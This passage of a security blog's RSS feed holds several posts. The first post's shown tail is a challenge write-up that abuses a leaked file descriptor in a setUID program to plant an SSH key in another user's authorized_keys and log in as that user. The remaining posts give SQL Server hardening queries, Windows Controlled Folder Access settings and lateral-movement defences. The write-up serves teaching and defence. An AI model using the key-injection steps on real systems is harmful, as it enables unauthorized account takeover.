+ writing ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge to fd 3
+</pre>
+<h3>Step 3: Logging in via SSH</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ssh -i bobkey tom@localhost
+$ id
+uid=1002(tom) gid=1002(tom) groups=1002(tom)
+</pre>
+<p>We&#8217;re done. We exploited the leaked file descriptor to write data of our choosing to tom&#8217;s authorized_keys file. We used a slightly unrealistic symlink attack along the way, but that doesn&#8217;t invalidate our discussion of how to use and abuse leaked file descriptors.</p>
+<h2>Conclusion</h2>
+<p>Hacker challenges are fun. Even when you accidentally find a much harder solution and waste 10 times longer than necessary.</p>
+<p>Writing secure setUID programs can be difficult. Particularly if you spawn child processes; particularly if you use open() in directories writable by other users. fs.protected_symlinks provides some mitigation for directories with the sticky bit set.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/">Exploiting inherited file handles in setUID programs</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>MS SQL Server audit: Surface area reduction (part 2)</title>
+		<link>https://labs.portcullis.co.uk/blog/ms-sql-server-audit-surface-area-reduction-part-2/</link>
+		<comments>https://labs.portcullis.co.uk/blog/ms-sql-server-audit-surface-area-reduction-part-2/#comments</comments>
+		<pubDate>Thu, 15 Feb 2018 20:27:39 +0000</pubDate>
+		<dc:creator><![CDATA[BLH]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[SQL Server]]></category>
+		<category><![CDATA[training]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3384</guid>
+		<description><![CDATA[<p>Continuing on from part 1, we will look other benchmark settings that will help to reduce the surface area of attack. Other settings There are a number of other settings in the Center for Internet Security (CIS) Security Benchmark for SQL Server relating to surface area reduction that should be considered: Set is_trustworthy settings for [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/ms-sql-server-audit-surface-area-reduction-part-2/">MS SQL Server audit: Surface area reduction (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Continuing on from <a href="/blog/ms-sql-server-audit-surface-area-reduction-part-1/">part 1</a>, we will look other benchmark settings that will help to reduce the surface area of attack.<span id="more-3384"></span></p>
+<h2>Other settings</h2>
+<p>There are a number of other settings in the Center for Internet Security (CIS) Security Benchmark for SQL Server relating to surface area reduction that should be considered:</p>
+<ul>
+<li>Set is_trustworthy settings for each database in sys.databases to off (2.10 in CIS SQL Server 2008R2; 2.9 in CIS SQL Server 2012)</li>
+<li>Disable unnecessary SQL Server protocols (2.11 in CIS SQL Server 2008R2; 2.10 in CIS SQL Server 2012)</li>
+<li>Configure SQL Server to use non-standard ports (2.12 in CIS SQL Server 2008R2; 2.11 in CIS SQL Server 2012)</li>
+<li>Set the &#8220;Hide Instance&#8221; option to Yes for Production SQL Server instances (2.13 in CIS SQL Server 2008R2; 2.12 in CIS SQL Server 2012)</li>
+<li>Disable the sa Login Account by setting is_disabled in sys.server_principals to yes where sid is 0&#215;01 (2.14 in CIS SQL Server 2008R2; 2.13 in CIS SQL Server 2012)</li>
+<li>Rename the sa Login Account (2.15 in CIS SQL Server 2008R2; 2.14 in CIS SQL Server 2012)</li>
+</ul>
+<h3>Set is_trustworthy setting is off for each database</h3>
+<p>Using the catalog view of databases (sys.databases), check whether the database is trusted or not using the &#8220;is_trustworthy_on&#8221;. Here we want to ensure that databases are considered not trusted and set to disabled (0).</p>
+<p>Note: The msdb database is excluded as <a title="disabling the trustworthy setting" href="http://support.microsoft.com/kb/2183687">disabling the trustworthy setting</a> may cause unexpected behaviour in SQL Server components that use information from the msdb database.</p>
+<p>A query can be constructed as follows:</p>
+<pre class="brush: sql; gutter: false; title: ; notranslate">
+SELECT name FROM sys.databases WHERE is_trustworthy_on = 1 AND name != 'msdb' AND state = 0;
+</pre>
+<p>The Trustworthy setting can also be observed using SQL Server Management Studio.</p>
+<ul>
+<li>Within the Object Explorer, navigate to the SQL Server Instance and expand the path to &#8220;Databases&#8221;</li>
+<li>Right-click on each database under &#8216;Databases&#8217; and &#8216;Databases\System databases&#8217; and select properties</li>
+<li>Click on &#8220;Options&#8221; page and scroll down in the right pane to &#8220;Miscellaneous&#8221; where &#8220;Trustworthy&#8221; is seen</li>
+</ul>
+<div id="attachment_3562" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-3385"><div class="lb-album"><a href="#image-3385"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/trustworthysqlstudio-300x210.png" alt="Trustworthy option for database in SQL Server Management Studio" class="size-medium wp-image-3562"><span></span></a></div>              
+<a href="#imageclose-3385" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-3385">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/trustworthysqlstudio.png" alt="image-3385">
+                   </div></a><p class="wp-caption-text">Trustworthy option for database in SQL Server Management Studio</p></div>
+<h3>Disable unnecessary SQL Server protocols</h3>
+<p>Ideally the number of SQL Server protocols enabled should be reduced. It is noted that CIS Security Benchmark do not score this particular issue.</p>
+<p>The list of SQL Server Protocols can be found in SQL Server Configuration Manager. To see the settings:</p>
+<ul>
+<li>Go to the SQL Server Network Configuration in object explorer and navigate to &#8220;Protocols for&#8221;</li>
+<li>Ensure that only required protocols are enabled</li>
+</ul>
+<p>Note: Microsoft does not specify exactly which protocols should be disabled. However, the setting for a default installation of SQL Server 2008R2 for example appears to be.</p>
+<ul>
+<li>NP (Named Pipes) &#8211; Disabled</li>
+<li>SM (Shared Memory) &#8211; Enabled</li>
+<li>TCP &#8211; Enabled</li>
+<li>Via &#8211; Disabled</li>
+</ul>
+<p>The following is query that performs a check on the protocols by checking the registry entry for each of the 4 possible protocols, NP (Named Pipes), SM (Shared Memory), TCP and Via. Note: It makes 4 separate queries for each protocol by finding whether registry entry is enabled or not with the results combined together using a union.</p>
+<pre class="brush: sql; gutter: false; title: ; notranslate">
+DECLARE @InstanceName nvarchar(50)
+DECLARE @MajorVersion decimal
+DECLARE @RegKey_Instance nvarchar(500)
+DECLARE @RegValue_Instance VARCHAR(100)
+
+DECLARE @RegKey nvarchar(500)
+DECLARE @Value_Sm int
+DECLARE @Display_Sm VARCHAR(20)
+DECLARE @Value_Np int
+DECLARE @Display_Np VARCHAR(20)
+DECLARE @Value_TCP int
+DECLARE @Display_TCP VARCHAR(20)
+DECLARE @Value_Via int
+DECLARE @Display_Via VARCHAR(20)
+
+-- Get the Instance Name. Default is 'MSSQLSERVER'
+SET @InstanceName=CONVERT(nVARCHAR,isnull(SERVERPROPERTY('INSTANCENAME'),'MSSQLSERVER'))
+
+-- Get the Major version number. 8=SQL2000, 9=SQL2005, 10=SQL2008, 11=SQL2012
+-- Convert first 2 characters ('8.', '9.', '10', '11'). Convert to Decimal
+SET @MajorVersion=CONVERT(decimal,CONVERT(varchar(2),(SERVERPROPERTY('ProductVersion'))))
+
+-- Get the RegKey for Instance Name (e.g. 'MSSQLSERVER')
+SET @RegKey_Instance='SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL'
+
+-- Get the RegValue for Instance Name (e.g. 'MSSQL10_50.MSSQLSERVER')
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey_Instance,
+  @value_name = @InstanceName,
+  @value = @RegValue_Instance OUTPUT
+
+-- Get the RegKey for SM (Shared Memory) and whether protocol is enabled
+SET @RegKey='SOFTWARE\Microsoft\Microsoft SQL Server\'+@RegValue_Instance+'\MSSQLServer\SuperSocketNetLib\Sm'
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey,
+  @value_name = 'Enabled',
+  @value = @Value_Sm OUTPUT
+
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey,
+  @value_name = 'DisplayName',
+  @value = @Display_Sm OUTPUT
+
+-- Get the RegKey for Np (Named Pipes) and whether protocol is enabled
+SET @RegKey='SOFTWARE\Microsoft\Microsoft SQL Server\'+@RegValue_Instance+'\MSSQLServer\SuperSocketNetLib\Np'
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey,
+  @value_name = 'Enabled',
+  @value = @Value_Np OUTPUT
+
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey,
+  @value_name = 'DisplayName',
+  @value = @Display_Np OUTPUT
+
+-- Get the RegKey for TCP and whether protocol is enabled
+SET @RegKey='SOFTWARE\Microsoft\Microsoft SQL Server\'+@RegValue_Instance+'\MSSQLServer\SuperSocketNetLib\TCP'
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey,
+  @value_name = 'Enabled',
+  @value = @Value_TCP OUTPUT
+
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey,
+  @value_name = 'DisplayName',
+  @value = @Display_TCP OUTPUT
+
+-- Get the RegKey for Via and whether protocol is enabled
+SET @RegKey='SOFTWARE\Microsoft\Microsoft SQL Server\'+@RegValue_Instance+'\MSSQLServer\SuperSocketNetLib\Via'
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey,
+  @value_name = 'Enabled',
+  @value = @Value_Via OUTPUT
+
+EXECUTE xp_regread
+  @rootkey = 'HKEY_LOCAL_MACHINE',
+  @key = @RegKey,
+  @value_name = 'DisplayName',
+  @value = @Display_Via OUTPUT
+
+SELECT @Display_Np as DisplayName, @Value_Np as Enabled
+UNION SELECT @Display_Sm, @Value_Sm
+UNION SELECT @Display_TCP, @Value_TCP
+UNION SELECT @Display_Via, @Value_Via
+</pre>
+<p>The following is a sample result from a SQL Server 2008R2 database instance:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+DisplayName          Enabled
+-------------------- -----------
+Named Pipes                    0
+Shared Memory                  1
+TCP/IP                         1
+VIA                            0
+</pre>
+<h3>Check port is running for SQL Server</h3>
+<p>An ideal practice is to configure the SQL server instance to not use the default TCP port of 1433. Using a non-default port helps protect the database from attacks directed to the default port. It is noted that CIS Security Benchmark do no score this particular issue.</p>
+<p>This can be checked using netstat and looking for port 1433 in command prompt:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+C:\&gt;netstat -ano
+</pre>
+<p>Or with PowerShell:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+C:\&gt;netstat -ano | select-string 1433.+listening
+</pre>
+<p>Alternatively, SQL Server Configuration Manager can be used to see what port is set:</p>
+<ul>
+<li>Go to the SQL Server Network Configuration in object explorer and navigate to &#8220;Protocols for&#8221;</li>
+<li>Right-click on &#8220;TCP&#8221;</li>
+<li>Click on the &#8220;IP Protocols&#8221; tab</li>
+<li>Observe the IP address and port that has been set</li>
+</ul>
+<p>You should also ensure the interface for each IP address (particularly Internet interface) is not enabled.</p>
+<p>A query that uses the registry settings for the TCP service used by SQL Server can be made and the port returned as follows:</p>
+<pre class="brush: sql; gutter: false; title: ; notranslate">
+DECLARE @InstanceName nvarchar(50)
+DECLARE @RegKey VARCHAR(100)
+DECLARE @PortNumber VARCHAR(20)
+
+-- Get the Instance Name. Default is 'MSSQLSERVER'
+SET @InstanceName=CONVERT(nVARCHAR,isnull(SERVERPROPERTY('INSTANCENAME'),'MSSQLSERVER'))
+
+SET @RegKey = 'SOFTWARE\MICROSOFT\MSSQLServer\'+@InstanceName+'\Supersocketnetlib\TCP'
+EXEC xp_regread
+  @rootkey='HKEY_LOCAL_MACHINE', @key=@RegKey,
+  @value_name='Tcpport', @value=@PortNumber OUTPUT
+
+SELECT @InstanceName as Instance, @PortNumber as Port
+</pre>
+<h3>Hidden option</h3>
+<p>Another good practice is to configure SQL Server instances within production environments as hidden to prevent advertisement by the SQL Server Browser service.</p>
+<p>The &#8220;Hide Instance&#8221; state can be found in SQL Server Configuration Manager. To see the settings:</p>
+<ul>
+<li>Go to the SQL Server Network Configuration in object explorer and navigate to &#8220;Protocols for&#8221;</li>
+<li>Right-click &#8220;Protocols for&#8221;, and then select &#8220;Properties&#8221;</li>
+<li>On the &#8220;Flags&#8221; tab, observe the &#8220;Hide Instance&#8221; box</li>
+<li>In the &#8220;Hide Instance&#8221; box, select Yes to enable hiding the server instance</li>
+</ul>
+<p>The following query can be used to determine if the server instance is hidden:</p>
+<pre class="brush: sql; gutter: false; title: ; notranslate">
+DECLARE @InstanceName nvarchar(50)
+DECLARE @MajorVersion decimal
+DECLARE @RegKey_Instance nvarchar(500)
+DECLARE @RegValue_Instance VARCHAR(100)&lt;/pre&gt;
+DECLARE @RegKey nvarchar(500)
+DECLARE @Value int
+
+-- Get the Instance Name. Default is 'MSSQLSERVER'
+SET @InstanceName=CONVERT(nVARCHAR,isnull(SERVERPROPERTY('INSTANCENAME'),'MSSQLSERVER'))
+
+-- Get the Major version number. 8=SQL2000, 9=SQL2005, 10=SQL2008, 11=SQL2012
+-- Convert first 2 characters ('8.', '9.', '10', '11'). Convert to Decimal
+SET @MajorVersion=CONVERT(decimal,CONVERT(varchar(2),(SERVERPROPERTY('ProductVersion'))))
+
+-- Get the RegKey for Instance Name (e.g. 'MSSQLSERVER')
+SET @RegKey_Instance='SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL'
+
+-- Get the RegValue for Instance Name (e.g. 'MSSQL10_50.MSSQLSERVER')
+EXECUTE xp_regread
+@rootkey = 'HKEY_LOCAL_MACHINE',
+@key = @RegKey_Instance,
+@value_name = @InstanceName,
+@value = @RegValue_Instance OUTPUT
+
+-- Get the RegKey for SM (Shared Memory) and whether protocol is enabled
+SET @RegKey='SOFTWARE\Microsoft\Microsoft SQL Server\'+@RegValue_Instance+'\MSSQLServer\SuperSocketNetLib'
+EXECUTE xp_regread
+@rootkey = 'HKEY_LOCAL_MACHINE',
+@key = @RegKey,
+@value_name = 'HideInstance',
+@value = @Value OUTPUT
+
+SELECT @InstanceName as 'InstanceName', @Value as 'HideInstance'
+</pre>
+<h3>Check sa account has been disabled</h3>
+<p>A good practice is to have the widely known system admin account sa disabled. Enforcing this control reduces the probability of an attacker executing brute force attacks.</p>
+<p>The following query shows the name of the system admin account, which sa by default and whether it is disabled:</p>
+<pre class="brush: sql; gutter: false; title: ; notranslate">
+SELECT name, is_disabled
+FROM sys.server_principals
+WHERE sid = 0x01;
+</pre>
+<h3>Check sa account has been renamed</h3>
+<p>A good practice is to have the widely known system admin account sa disabled. It is more difficult to launch password-guessing and brute-force attacks against the sa account if the username is not known.</p>
+<p>The following query lists the name of the system admin account:</p>
+<pre class="brush: sql; gutter: false; title: ; notranslate">
+SELECT name
+FROM sys.server_principals
+WHERE sid = 0x01;
+</pre>
+<h2>Summary</h2>
+<p>In this article, you have seen a few more settings that can be used to configure to reduce the surface area of attack and improve the security of the SQL Server following good practices and the CIS Security Benchmark.</p>
+<p>You can audit manually looking at SQL Server Management Studio and SQL Server Configuration Manager. You can also create a query that will read the catalog information for the databases and the registry to gather the information about the server instance.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/ms-sql-server-audit-surface-area-reduction-part-2/">MS SQL Server audit: Surface area reduction (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/ms-sql-server-audit-surface-area-reduction-part-2/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Windows 10’s &#8220;Controlled Folder Access&#8221; feature</title>
+		<link>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/</link>
+		<comments>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/#comments</comments>
+		<pubDate>Thu, 16 Nov 2017 09:44:52 +0000</pubDate>
+		<dc:creator><![CDATA[RGH]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6110</guid>
+		<description><![CDATA[<p>Microsoft released a rolling upgrade of Windows 10 in October 2017. The &#8220;Fall Creators&#8221; edition (version 1709, codename Redstone 3) contains a new feature called &#8220;Controlled Folder Access&#8221;, which is designed to combat ransomware attacks. Controlled Folder Access is part of Windows Defender Security Centre that works with Windows Defender Anti-Virus to prevent &#8220;suspicious&#8221; executable [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/">Windows 10’s &#8220;Controlled Folder Access&#8221; feature</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Microsoft released a rolling upgrade of Windows 10 in October 2017. The &#8220;Fall Creators&#8221; edition (version 1709, codename Redstone 3) contains a new feature called &#8220;Controlled Folder Access&#8221;, which is designed to combat ransomware attacks.<span id="more-6110"></span></p>
+<p>Controlled Folder Access is part of Windows Defender Security Centre that works with Windows Defender Anti-Virus to prevent &#8220;suspicious&#8221; executable files, DLLs, and scripts from writing to (or encrypting) files within certain folders.</p>
+<h2>What folders are protected?</h2>
+<p>While additional folders can be added, the following locations will always be monitored when Controlled Folder Access is enabled:</p>
+<ul>
+<li>User: Documents, Pictures, Videos, Music, Desktop, Favorites</li>
+<li>Public: Documents, Pictures, Videos, Music, Desktop</li>
+</ul>
+<h2>How does Windows determine what `suspicious&#8217; code is?</h2>
+<p>It’s what Windows Defender Anti-Virus identifies. As such Controlled Folder Access relies on Windows Defender Anti-Virus to be running.</p>
+<h2>What about application false positives?</h2>
+<p>It may be the case that legitimate applications are incorrectly flagged by Windows Defender Anti-Virus as being `suspicious&#8217; preventing or hindering legitimate use. Such applications can be white-listed.</p>
+<p>To facilitate this, Controlled Folder Access supports an `audit&#8217; mode, where an event is generated when the application would normally be prevented from writing to a protected folder. Those events can be reviewed to identify legitimate applications that can be added to the white-list.</p>
+<h2>Is Controlled Folder Access enabled by default? How do I configure it?</h2>
+<p>Controlled Folder Access is not enabled by default and can be configured via:</p>
+<ul>
+<li>The User Interface</li>
+<li>Group Policy (a Group Policy would need to be configured on a system that contains the correct administrative templates for the options to be available for selection): Computer Configuration > Administrative Templates > Windows Components > Windows Defender Anti-Virus > Windows Defender Exploit Guard > Controlled Folder Access</li>
+<li>Manual Registry modification (i.e. via a script)</li>
+<li>PowerShell cmdlets:</li>
+</ul>
+<pre class="brush: powershell; gutter: false; title: ; notranslate">
+Set-MpPreference -EnableControlledFolderAccess [Enable | Disable | Audit]
+Add-MpPreference -ControlledFolderAccessProtectedFolders c:\path\to\protect,c:\other\path
+Remove-MpPreference -ControlledFolderAccessProtectedFolders c:\path\to\no\longer\protect
+</pre>
+<p>Note: Set-MpPreference can also be used to specify folder items but will clear the list first, whereas Add-MpPreference adds to the list.</p>
+<h2>What Registry keys are used by Controlled Folder Access?</h2>
+<h3>Is Controlled Folder Access enabled?</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry path: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exploit Guard\Controlled Folder Access
+Registry Key: GuardMyFolders
+Key Type: REG_DWORD
+Key Value: 0
+</pre>
+<h3>Protected Folders</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry path: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exploit Guard\Controlled Folder Access\ProtectedFolders
+Registry Key: audit
+Key Type: REG_DWORD
+Key Value: 0
+</pre>
+<h3>To specify protected folders:</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry path: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exploit Guard\Controlled Folder Access\ProtectedFolders
+Registry Key: Full path to protect, i.e. c:\test
+Key Type: REG_DWORD
+Key Value: 0&lt;/code&gt;
+</pre>
+<h2>What can be protected? Any limitations?</h2>
+<p>Network shares and mapped drives can be protected, but Controlled Folder Access does not support the use of:</p>
+<ul>
+<li>Environment Variables</li>
+<li>Wildcards</li>
+<li>The Windows drive (typically C:\)</li>
+</ul>
+<p>Seriously, don’t protect the entire Windows drive as Windows will be unable to function correctly and strange behaviour will result.</p>
+<h3>What happens when write access is blocked?</h3>
+<p>A notification is displayed that provides the path of the executable that was blocked, and the path of protected folder that the write attempt was for. This information is also recorded in the event log, using the following event values:</p>
+<ul>
+<li>Event ID: 5007: Event when settings are changed</li>
+<li>Event ID: 1124: Audited Controlled folder access event</li>
+<li>Event ID: 1123: Blocked Controlled folder access event</li>
+</ul>
+<p>The following image shows the notification of a write action being blocked:</p>
+<p><a name="imageclose-6111"><div class="lb-album"><a href="#image-6111"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2017/11/VirtualBox_Win10_Ent_90days_02_11_2017_14_17_19-300x225.png" alt="Blocked write access notification" class="size-medium wp-image-6121"><span></span></a></div>              
+<a href="#imageclose-6111" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6111">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2017/11/VirtualBox_Win10_Ent_90days_02_11_2017_14_17_19.png" alt="image-6111">
+                   </div></a></p>
+<h3>Can the blocked write notification message be customised?</h3>
+<p>Yes, at least for Enterprise environments. Providing details of who to contact (service desk, IT Security, etc.) can be included in the notification message via the following Group Policy settings:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Computer Configuration &gt; Policies &gt; Adminstrative Templates &gt; Windows Components &gt; Windows Defender Security Center &gt; Enterprise Customization
+</pre>
+<ul>
+<li> Set &#8220;Configure customized contact information&#8221; to &#8220;Enabled&#8221;</li>
+<li> Set &#8220;Configure customized notifications&#8221; to &#8220;Enabled&#8221;</li>
+<li> Set &#8220;Specify contact compant name&#8221; to &#8220;Enabled&#8221; and add the company details</li>
+<li> Enable and set at least one of the following:
+<ul>
+<li>&#8220;Specify contact email address or EmailID&#8221;</li>
+<li>&#8220;Specify contact phone number or Skype ID&#8221;</li>
+<li>&#8220;Specify contact web site&#8221;</li>
+</ul>
+</li>
+</ul>
+<h3>Does Controlled Folder Access work with third-party Anti-Virus applications?</h3>
+<p>No, or at least not in the tests performed when writing this post. Controlled Folder Access requires the use of Windows Defender Anti-Virus to be active.</p>
+<p>Most third-party Anti-Virus solutions replace existing products, and attempting to run multiple Anti-Virus solutions at the same time can significantly hinder system performance, or even lead to each one preventing the other from being able to scan files or removable drives which could lower protections. One Anti-Virus program might flag others as being infected (i.e. triggering on the detection patterns) or malicious, and quarantine key files – potentially breaking that product.</p>
+<h3>How can I tell Controlled Folder Access and Notifications are configured and working?</h3>
+<p>Microsoft have produced an ExploitGuard CFA File Creator tool to trigger Controlled Folder Access actions, which causes notifications to be displayed.</p>
+<p>Details on the <a href="https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/evaluate-controlled-folder-access#use-the-demo-tool-to-see-how-controlled-folder-access-works" title="ExploitGuard CFA Demo Tool">ExploitGuard CFA Demo Tool</a>, and a link to download it, can be found on Microsoft&#8217;s web site.</p>
+<h2>Conclusion</h2>
+<p>For home users or business that do not have a corporate Anti-Virus solution, Windows Defender Anti-Virus and Controlled Folder Access will be better than nothing.<br />
+However, larger businesses typically have existing enterprise-wide Anti-Virus solutions in which significant time and effort (and money) has been invested. It would be difficult to convince the IT Security teams of such companies to throw out that investment, so I don’t expect Controlled Folder Access to be used much in large businesses.</p>
+<p>Controlled Folder Access is a new feature, and it may be that Microsoft modify it to work with third-party Anti-Virus products in the future.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/">Windows 10’s &#8220;Controlled Folder Access&#8221; feature</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Hindering Lateral Movement</title>
+		<link>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/</link>
+		<comments>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/#comments</comments>
+		<pubDate>Fri, 27 Oct 2017 12:53:52 +0000</pubDate>
+		<dc:creator><![CDATA[RGH]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6092</guid>
+		<description><![CDATA[<p>Lateral Movement is a method used by attackers (or malware) against a network Domain. After an initial device is compromised (typically, a user&#8217;s workstation), the attacker extracts passwords from memory, or obtains encrypted password hashes from the system for cracking or direct use (i.e. Pass the Hash). The attacker then attempts to login to other [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/hindering-lateral-movement/">Hindering Lateral Movement</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Lateral Movement is a method used by attackers (or malware) against a network Domain. After an initial device is compromised (typically, a user&#8217;s workstation), the attacker extracts passwords from memory, or obtains encrypted password hashes from the system for cracking or direct use (i.e. Pass the Hash). The attacker then attempts to login to other systems using those credentials to search for cached passwords of privileged Domain accounts. Usually, the local Administrator account is targeted as the password is often the same on all systems (due to the common practice of deploying systems from a master image), but service accounts, etc. can also be targeted.<span id="more-6092"></span></p>
+<p>In some cases, an attacker is able to move from having local Administrator access on a workstation to gaining full Domain Admin rights on the Domain in under an hour.</p>
+<p>Since Active Directory typically controls access to highly sensitive information, it is important to try and prevent lateral attacks from working. Being able to spot these attacks would also be good.</p>
+<h2>Limit workstation to workstation communications</h2>
+<p>It is highly unusual for network users to need to directly communicate with other users’ workstations.</p>
+<p>Configure each workstation to use a local firewall to block incoming Windows network traffic (139/TCP, 445/TCP and 137/UDP) from any workstation subnet. </p>
+<p>If using a firewall that supports different network zones (such as the Windows Firewall), ensure the appropriate zone profiles are configured, or simply configure all profiles. If your organisation uses VoIP telephones, prevent those subnets from connecting as well to protect against either a malicious internal employee, or in case the attacker is able to convince a user to try changing network connections.</p>
+<h2>Prevent local users from logging in over the network</h2>
+<p>If an attacker finds that they cannot directly connect to other workstations to hunt for privileged cached credentials, they may attempt to compromise a server and try to login to workstations from there. To protect against this, configure the User Rights policy &#8216;Deny access to this computer from the network&#8217; by adding local user accounts.</p>
+<h2>Use a local Administrator password management tool</h2>
+<p>Tools, such as Microsoft LAPS, exist that set unique passwords for the local administrator account. By using such tools, when a password exceeds its expiration date the password will be changed automatically when the Group Policy is refreshed. Avoid writing a custom password management system, as it is very difficult to implement such things without error; if an attacker is able to determine a pattern to setting the password, then that defence is gone.</p>
+<h2>Configure systems via Group Policy</h2>
+<p>To reduce the risk of credentials being captured, avoid logging into systems where not necessary. Use Group Policies to configure workstations and servers instead of directly logging into them, where possible. Systems may be configured to cache credentials when users login, and this information can be obtained by an attacker and then cracked offline to reveal the plain text password for that user account. If an attacker already has a foothold on a system and a Domain Administrator logs in, the attacker may be able to impersonate the Domain Administrator in order to utilise their privileges within the network Domain.</p>
+<h2>Use dedicated administrative accounts and workstations</h2>
+<p>An attacker can only extract privileged password data if it is present on the system. Ensure administrative users have user accounts that are separate from their day-to-day user accounts and configure them so that they cannot login to normal workstations or servers; they should only be used to login to Active Directory servers to manage them, and configure Group Policies to manage other systems.</p>
+<p>Dedicated management workstations should not be able to access the Internet or email.</p>
+<h2>Disable &#8216;WDigest&#8217;</h2>
+<p>Windows supports several Security Support Providers (SSPs), used to handle authentication requests (including Single Sign On). Until recently (Window 8.1 and Server 2012 R2 or higher), Windows used by default an SSP called &#8216;WDigest&#8217; &#8211; which stored user credentials in plain text in memory, allowing a process with local Administrator privileges to extract the passwords of all logged-in users.</p>
+<p>To help address this issue, Microsoft created a new Registry key for &#8216;WDigest&#8217; to disable storing plain text passwords, which can be applied to Windows, prior to 8.1 and Server 2012 R2 by installing KB2871997 and configuring the following Registry setting:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry Path: HKLM\System\CurrentControlSet\Control\SecurityProviders\Wdigest
+Key Name: UseLogonCredential
+Key Type: REG_DWORD
+Key Value: 0
+</pre>
+<p>Alternatively, KB2871997 can be configured via Group Policy by installing the PtH.admx/adml files provided with the Microsoft Security Compliance Manager (SCM) via:</p>
